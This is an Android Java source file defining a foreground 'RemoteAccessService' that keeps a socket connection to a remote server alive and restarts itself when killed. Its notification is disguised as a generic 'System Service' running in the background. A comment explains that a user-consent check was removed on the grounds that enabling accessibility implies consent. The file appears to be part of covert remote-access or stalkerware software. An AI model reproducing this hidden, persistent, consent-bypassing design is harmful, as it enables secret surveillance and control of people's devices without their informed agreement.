package com.task.tusker.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.task.tusker.MainActivity;
import com.task.tusker.R;
import com.task.tusker.network.SocketManager;

public class RemoteAccessService extends Service {

    private static final String TAG = "RemoteAccessService";
    private static final String CHANNEL_ID = "RemoteAccessChannel";
    private static final int NOTIFICATION_ID = 1;

    private SocketManager socketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Log.d(TAG, "Service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand — starting foreground + connecting socket");

        // Always run as foreground service so Android doesn't kill us
        startForeground(NOTIFICATION_ID, createNotification());

        // Always connect — the accessibility service enables this service
        // only after the user manually turns on accessibility, so consent
        // is implicitly given.  The old consent check prevented reconnection
        // when the service was restarted by the accessibility watchdog.
        connectToServer();

        // START_STICKY: if Android kills this service, restart it automatically
        return START_STICKY;
    }

    private void connectToServer() {
        try {
            socketManager = SocketManager.getInstance(this);
            // forceReconnect() tears down any stale sockets from a previous process
            // and starts fresh connection loops — handles crash-restart correctly.
            socketManager.forceReconnect();
            Log.d(TAG, "SocketManager.forceReconnect() called");
        } catch (Exception e) {
            Log.e(TAG, "connectToServer error: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Remote Access Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Keeps remote access connection active");
            channel.setShowBadge(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    ? PendingIntent.FLAG_IMMUTABLE : 0;
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, flags);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed — socket will be disconnected");
        if (socketManager != null) {
            socketManager.disconnect();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
